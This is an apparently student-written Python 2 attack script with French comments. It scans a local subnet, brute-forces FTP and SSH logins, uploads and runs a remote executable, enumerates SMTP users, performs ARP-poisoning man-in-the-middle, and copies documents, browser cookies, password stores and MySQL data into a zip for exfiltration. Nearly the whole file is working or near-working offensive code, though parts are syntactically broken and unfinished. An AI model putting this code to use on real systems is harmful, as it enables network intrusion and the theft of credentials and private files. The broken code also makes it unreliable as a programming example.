# -*- coding: utf-8 -*-

#Imports pour la propag
###########################################################################
from logging import getLogger, ERROR # Import Logging Things			  #
getLogger("scapy.runtime").setLevel(ERROR) # Get Rid if IPv6 Warning	  #
from scapy.all import * # The One and Only Scapy                          #
import sys, os, platform 												  #
from datetime import datetime # Other stuff								  #
from time import strftime												  #
from ftplib import FTP													  #
import paramiko															  #
import socket
import re
import time														          #
###########################################################################
#TODO: multithreading biatch



###########################
#    IMPORT  pour polop.py#
###########################

import argparse
import os, sys
import shutil, zipfile
import os.path
import glob
import subprocess
import getpass
###########################

#Vars
###########################################################################
ports = [21, 22, 23, 25, 135 ] # ports a scanner
ip_start = "192.168.0."
ip_range = range(2, 256)
start_clock = datetime.now() # Start clock for scan time
interface = "eth0" #utilisé dans la récuparation d'adresses MAC
gateIP = "192.168.0.1"
passwords = ["test", "admin", "1234", "blabla"]
names = ['root','rminot','apinsard','msavigny']
###########################################################################


def checkhost(ip):# retourne "true" si l'host est alive
	# type de ping en fonction de l'os
	ping_str = "-n 1" if  platform.system().lower()=="windows" else "-c 1"
	# Ping
	return os.system("ping " + ping_str + " " + ip) == 0

def scanport(port): # Function pour scanner un port donné
	srcPort = random.randint(1025,65534)
	resp = sr1(IP(dst=current_target)/TCP(sport=srcPort,dport=port,flags="S"),timeout=10)
	if (str(type(resp)) == "<type 'NoneType'>"):
		print current_target + ":" + str(port) + " is filtered (silently dropped)."
	elif(resp.haslayer(TCP)):
		if(resp.getlayer(TCP).flags == 0x12):
			send_rst = sr(IP(dst=current_target)/TCP(sport=srcPort,dport=port,flags="R"),timeout=10)
			print current_target + ":" + str(port) + " is open."
			return True
		elif (resp.getlayer(TCP).flags == 0x14):
			print current_target + ":" + str(port) + " is closed."
	elif(resp.haslayer(ICMP)):
		if(int(resp.getlayer(ICMP).type)==3 and int(resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
			print current_target + ":" + str(port) + " is filtered (silently dropped)"

def get_mac(IP):#recuperer l'adresse MAC d'une IP donnée
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reARP():#remettre d'equerre les tables ARP de la victime et de la passerelle
	print "\n[*] Restoration des tables ARP en cours"
	victimMAC = get_mac(current_target)
	gateMAC = get_mac(str(gateIP))
	send(ARP(op = 2, pdst = gateIP, psrc = current_target, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = current_target, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print "\n[*] Done"

def trick(gm, vm): #ARP poisonning
	send(ARP(op = 2, pdst = current_target, psrc = gateIP, hwdst= vm))
	send(ARP(op = 2, pdst = gateIP, psrc = current_target, hwdst= gm))
	
def mitm(): # fonction man in the middle
	try:
		victimMAC = get_mac(current_target)
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Adresse MAC Victime non trouvée"

	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[!] Adresse MAC Passerelle non trouvée"
	print "[*] Poisoning..."
	
	# a faire, mitm pour un temps donné.
	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
			print s.rcvfrom(655565) >> '/exfiltration/capt_reseau.txt'
		except KeyboardInterrupt:
			reARP()
			break
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		

#TODO brute force -> meilleure gestion des exceptions ; multithreading
			
def bruteFTP(ip): #bruteforce FTP + récuperation de données
	storedir = "/exfiltration"
	ftp=FTP(ip)
	for password in passwords:
		try:
			ftp.login("admin", password)
			print "FTP PWND"
		except:
			print "mot de passe incorrect"
			continue
		
		print "énumération des fichiers présents sur le ftp"
		try:
			files = ftp.nlst()
			for i,v in enumerate(files,1):
				print i,"->",v
			print ""
		except:
			print "erreur du listing des fichiers FTP"
			break
			
		try:
			currdir=os.getcwd()
			for j in range(len(files)):
				os.chdir(storedir)
				print "telechargement de =>",files[j]
				fhandle = open(files[j], 'wb')
				ftp.retrbinary('RETR ' + files[j], fhandle.write)
				fhandle.close()
			os.chdir(currdir)
			ftp.quit()
			break
		except:
			print "ereur de telechargement // commande RETR non présente sur le serveur ftp ?"
			break

def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupération de données
	exec_dir = ""
	for password in passwords:
		source = '/exploit_locale.exe'
		destination ='/home/Admin/Desktop/exploit_locale.exe'
		remotezip='/home/Admin/Desktop/collecte.zip'
		tolocalzip='/exfiltration/collecte.zip'
		#a activer ou désactiver pour le debug
		#paramiko.util.log_to_file("paramiko.log")
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(ip,port=22,username="Admin",password=password)
			print "[*] SSH IP: %s Password found: %s\\n" % (current_target,password)
		except paramiko.AuthenticationException:
			print "[*] SSH IP: %s Password failed: %s" % (current_target,password)
			continue
			
		try:
			sftp = ssh.open_sftp()
			sftp.put(source,destination)
			stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
			time.sleep(5)
			sftp.get(remotezip,tolocalzip)
			break
		except:
			print "[*] erreur lors du transfert sftp"
			break
		except KeyboardInterrupt:
			print "[*] Interruption du bruteforce"
			break
		ssh.close()

def smtp_enum(host,port):
	print "[+] Connecting to server" 
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
	 
	try: 
		connect=s.connect((host,port)) 
	except socket.timeout: 
	  	print "\n[-] Server timed out" 
		continue
	except socket.error: 
	  	print "\n[-] There was an error with the server" 
		continue
	print "[+] Connected on" +timer() 
	print "[+] Waiting for SMTP banner" 
	banner=s.recv(1024) 
	print banner 

	for line in names: 
		s.send('VRFY '+line) 
	        result=s.recv(1024) 
		bad = re.match("502",result)  
		bad1 = re.search("send some mail",result)
		found = re.search("252",result)
		notfound = re.match("550",result)
		if bad or bad1: 
			print "[-] This server is not vulnerable!" 
			continue
		elif notfound:
			print "[-] Not found "+line
		elif found: 
	        	print "[+] Found! "+line 
#
##		        	TODO
###
####					Si on trouve un USER ton l'ajoute dans un csv 
#####
		 
		s.close()

def pwnd_by_ms1710():
		#A Lot to do
		#wanacry en plus vener
	print lol

class info_search():

	#Chemin ou sont stockes les fichiers dumpes
	#path_docs = 'E:\Pytest'

    	#Debut de larborescence que lon veut lister 
  	 #Sous linux la racine est /
    #Sous windows chaque partition a sa racine (exemple C:\)
    #rootDir = 'C:\Users\%USERNAME%\Documents\Jesuistonpere' #C:\\

	def __init__(self):
		self.argParse()


    	def argParse(self):

        	#Creation du parser
        	parser = argparse.ArgumentParser(description='Usage script info_search.py')
        	#Ajout des options dans un groupe specifique
        	options = parser.add_argument_group('options','')
        	#Liste des options disponibles
        	options.add_argument('-a', '--all', action="store_true", dest='all', default=False, help="Dump all files list in -f option")
        	options.add_argument('-c', '--char', action="store", dest='char', type=str, default=False, help="Dump files by charactere of your choice")
        	options.add_argument('-f','--format', action="store", dest='format', type=str, choices=['doc','docx','xls','xlsx','csv','ppt','pptx','txt','pst','jpg','png','pdf','vsd','vsdx','zip','rar'], default=False, help="Dump files of your choice")
        	#options.add_argument('-p', '--password', action="store_true", default=False, dest='hash', help="Dump sam file (hash password)")
        	options.add_argument('-b', '--browser', default=False, dest='browser', action="store_true", help="Dump browser cookies and passwords")
        	options.add_argument('-d', '--db', default=False, dest='database', action="store_true", help="Dump database")
        	options.add_argument('-e', '--encode', default=False, dest='encode', action='store_true', help='Encode archive contains all dump')


        	#On parse les arguments
        	args = parser.parse_args()

        	self.all = args.all
        	self.char = args.char
        	self.format = args.format
        	#self.hash = args.hash
        	self.browser= args.browser
        	self.database = args.database
        	self.encode=args.encode

        	#print args


    	def parse_all(self):

        	#Chemin ou sont stockes les fichiers dumpes
        	path_docs = os.getcwd()
        	#Debut de larborescence que lon veut lister 
        	#Sous linux la racine est /
        	#Sous windows chaque partition a sa racine (exemple C:\)
        	username = getpass.getuser()
        	#rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\ Poue windows7
        	#rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'
        	rootDir = 'C:\\'
        
        	for dirName, subdirList, fileList in os.walk(rootDir):
			#Ouverture du fichier "Directory_Tree.txt"
            		fichier = open("Directory_Tree.txt", 'a')
            		fichier.write('\n %s' % dirName)
            		fichier.write('\n %s' % subdirList)
            		fichier.write('\n %s' % fileList)
            		fichier.write('\n *********************************************************************')                
            		fichier.close()

            	for file in fileList :

                	try:
                    		filename, extension = file.rsplit('.', 1)
                   
                    		if extension == "docx" or extension == "doc":
                        	#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                    		if extension == 'xls' or extension =='xlsx' or extension == 'csv':
                        		#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                    		if extension == 'ppt' or extension == 'pptx':
                        		#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                    		if extension == 'txt':
                        		#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                    		if extension == 'pst':
                        		#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                    		if extension == 'jpg' or extension == 'png':
                        		#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                    		if extension == 'pdf':
                        		#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                    		if extension == 'vsd' or extension == 'vsdx':
                        		#Copie des fichiers trouvees dans la destination qui va bien
                        		shutil.copy2(dirName+'\\'+file, path_docs)
                   		 if extension == 'zip' or extension == 'rar':
                       		 	#Copie des fichiers trouvees dans la destination qui va bien
                       		 	shutil.copy2(dirName+'\\'+file, path_docs)
                    		elif extension != 'doc' or extension != 'docx' or extension != 'xls' or extension != 'xlsx' or extension != 'csv' or extension != 'ppt' or extension != 'pptx' or extension != 'txt' or extension != 'pst' or extension != 'jpg' or extension != 'png' or extension != 'pdf' or extension != 'vsd' or extension != 'vsdx' or extension != 'zip' or extension != 'rar':
                        		break

                	except:
                    		#print("[ERROR] Split error")
                    		break





        #print "Parse_all [OK]"


	def parse_with_char(self):

        	#Chemin ou sont stockes les fichiers dumpes
        	path_docs = os.getcwd()

        	#Debut de larborescence que lon veut lister 
        	#Sous linux la racine est /
        	#Sous windows chaque partition a sa racine (exemple C:\)
        	username = getpass.getuser()
        	#rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\\
        	rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'

        	#rootDir = 'C:\\'

        	char_choice = glob.glob(str(self.char))
        	for dirName, subdirList, fileList in os.walk(rootDir):
           		 #Ouverture du fichier "Directory_Tree.txt"
            		fichier = open("Directory_Tree.txt", 'a')
            		fichier.write('\n %s' % dirName)
            		fichier.write('\n %s' % subdirList)
            		fichier.write('\n %s' % fileList)
            		fichier.write('\n *********************************************************************')                
            		fichier.close()

           	for file in fileList : 
                	filename, extension = file.rsplit('.', 1)
                	#print(extension)
               		if filename == self.char:
                    		#print("Copie de "+dirName+ '\\'+file+' vers '+path_docs)
                    		shutil.copy2(dirName+'\\'+file, path_docs)


   

        	#print "Parse_with_char [OK]"

	def parse_with_format(self):  
        
        	#Chemin ou sont stockes les fichiers dumpes
        	path_docs = os.getcwd()

        	#Debut de larborescence que lon veut lister 
        	#Sous linux la racine est /
        	#Sous windows chaque partition a sa racine (exemple C:\)
        	username = getpass.getuser()
        	#rootDir = 'C:\Users' + '\\' + username + '\Documents\Jesuistonpere' #C:\\
        	rootDir = 'C:\Documents and Settings'+ '\\' + username + '\My Documents\Jesuistonpere'
        	#rootDir = 'C:\\'

        	for dirName, subdirList, fileList in os.walk(rootDir):
            		#Ouverture du fichier "Directory_Tree.txt"
            		fichier = open("Directory_Tree.txt", 'a')
            		fichier.write('\n %s' % dirName)
            		fichier.write('\n %s' % subdirList)
            		fichier.write('\n %s' % fileList)
            		fichier.write('\n *********************************************************************')                
            		fichier.close()
           		for file in fileList : 
              			filename, extension = file.rsplit('.', 1)
                		if extension == self.format:
                    			#print("Copie de "+dirName+ '\\'+file+' vers '+path_docs)
                    			shutil.copy2(dirName+'\\'+file, path_docs)




	def dump_browser(self):

        	#Chemin ou sont stockes les fichiers dumpes
        	path_docs = os.getcwd()
        	username = getpass.getuser()


        #####################
        ##### WINDOWS XP ####
        #####################

	    	### IE ####
		path_ie_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Cookies' 
        	path_ie_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Microsoft\Credentials'
        
        	#COOKIES
        	for dirName, subdirList, fileList in os.walk(path_ie_cookies):
            		for file in fileList :
                		try:
                    			shutil.copy2(file, path_docs)
                		except:
                    			break

        	#MOTS DE PASSES
        	for dirName, subdirList, fileList in os.walk(path_ie_mdp):
           		for file in fileList :
                		try:
                    			shutil.copy2(file, path_docs)
                		except:
                    			break



    		#### Firefox ####

        	path_fi_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\ytyz5ohr.default\cookies.sqlite'
        	path_fi_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Mozilla\Firefox\Profiles\ytyz5ohr.default\key3.db'

        #COOKIES
        	for dirName, subdirList, fileList in os.walk(path_fi_cookies):
            		for file in fileList :
                		try:
                    			shutil.copy2(file, path_docs)
                		except:
                    			break

    
        #MOTS DE PASSE
        	for dirName, subdirList, fileList in os.walk(path_fi_mdp):
           		for file in fileList :
                		try:
                    			shutil.copy2(file, path_docs)
                		except:
                    			break






    #### Chrome ####

        	path_ch_cookies = 'C:\Documents and Settings'+ '\\' + username + '\Cookies'
        	path_ch_mdp = 'C:\Documents and Settings'+ '\\' + username + '\Application Data\Google\Chrome\User\Data\Default\Web Data'


        #COOKIES
        	for dirName, subdirList, fileList in os.walk(path_ch_cookies):
            		for file in fileList :
                		try:
                    			shutil.copy2(file, path_docs)
                		except:
                   			break
	
        #MOTS DE PASSE
        	for dirName, subdirList, fileList in os.walk(path_ch_mdp):
            		for file in fileList :
                		try:
                    			shutil.copy2(file, path_docs)
                		except:
                    			break
					

	def dump_database(self):

        #MySQL
        	path_mysql = 'C:\Program Files\MySQL\MySQL Server 5.0\data\mysql'
        	path_docs = os.getcwd()
        
        	if bool(path_mysql) == True:
            		try:
                		for dirSQL, subdirSQL, fileSQL in os.walk(path_mysql):
                    			for i in fileSQL:
                        		#print(i)
                        			try:
                            				shutil.copy2(i, path_docs)
                        			except:
                            				print("")
            		except:
                		print("")        

	def archivage(self):

        	#Chemin ou sont stockes les fichiers dumpes
        	path_docs = os.getcwd()

        	#Archivage
        	fic_all = os.listdir(path_docs)
        	zfile = zipfile.ZipFile('zipDump.zip','a')
        	try:
            		for i in fic_all:
                		zfile.write(i)
                		os.remove(i)
        

        	finally:
            		zfile.close()



	def fileEncrypt(self):

        #Ajouter l'encode de l'archive 




	def main_infosearch(self):

        	myinstance = info_search()
        	if self.all == True and self.char == False and self.format == False:
            		#print "all main [OK]"
            		myinstance.parse_all()
        	if bool(self.char) == True and self.all == False:
            		#print "char main [OK]"
            		myinstance.parse_with_char()
        	if bool(self.format) == True and self.all == False:
            		#print "format main [OK]"
            		myinstance.parse_with_format()
        	# elif self.hash == True:
        		#     #print "hash main [OK]"
        		#     myinstance.dump_pass()
        	elif self.browser == True:
            		#print "browser main [OK]"
            		myinstance.dump_browser()
       	 	elif self.database == True:
           		 #print "database main [OK]"
            		myinstance.dump_database()


        	elif self.all == False and self.char == False and self.format == False and self.browser == False and self.database == False:
            		sys.exit()

            		#and self.hash == False


        	if self.all == True or bool(self.char) == True or bool(self.format) == True or self.browser == True or self.database == True:
            
            		#and self.hash == True

            		try:
                		myinstance.archivage()
            		except:
                		sys.exit()


#main

print "[*] récupération des documents spécifiques"
myinstanceglobal = info_search()
myinstanceglobal.main_infosearch()
print "[*] fichier enregistré sous collecte.zip

for i in ip_range:
	current_target = ip_start + str(i)
	print current_target
	# on check si la victime est "up"
	if checkhost(current_target) == True:
		print "[*] les Scan a démmaré a " + strftime("%H:%M:%S") + "!\n"
		# confirmation debut du scan
		for port in ports:
			if scanport(port) == True: # Test result
				print "[*] Port: ",port, " OUVERT a l'attaque"
				if port == 21:
					print "[*]debut du bruteforce FTP"
					bruteFTP(current_target)
					print "[*]fin du bruteforce FTP"

				elif port == 22:
					print "[*]debut du bruteforce SSH"
					bruteSsh(current_target)
					print "[*]fin du bruteforce SSH"

				elif port == 25:
					smtp_enum(host=current_target,port=port)

				elif port == 135:
					print "[*] DCOMRPC - not working.. yet"	
				else:
					print "[*] Port non-exploitable"

		stop_clock = datetime.now() 
		total_time = stop_clock - start_clock # Calculate scan time
		print "\n[*] Scan Terminé" # Confirm scan stop
		print "[*] Durée du scan: " + str(total_time) # Print scan time

		print "[*] Debut du man in the middle"
		mitm()
		print "[*] fin du man in the middle"


	else:
		continue
